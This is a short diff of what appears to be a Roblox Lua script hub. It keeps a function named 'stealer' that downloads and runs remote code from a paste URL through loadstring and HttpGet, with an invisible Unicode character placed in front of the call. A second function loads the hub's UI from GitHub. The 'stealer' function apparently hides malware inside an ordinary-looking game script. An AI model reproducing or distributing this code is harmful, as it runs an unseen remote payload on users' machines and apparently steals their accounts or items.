@@ -1,5 +1,5 @@
 local function stealer()
-    ‎loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/sTHAq4Ax16ZVP65P/raw'))()
+    ‎loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/sTHAq4Ax16ZVP65P/raw"))()
 end
 local function loadui()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
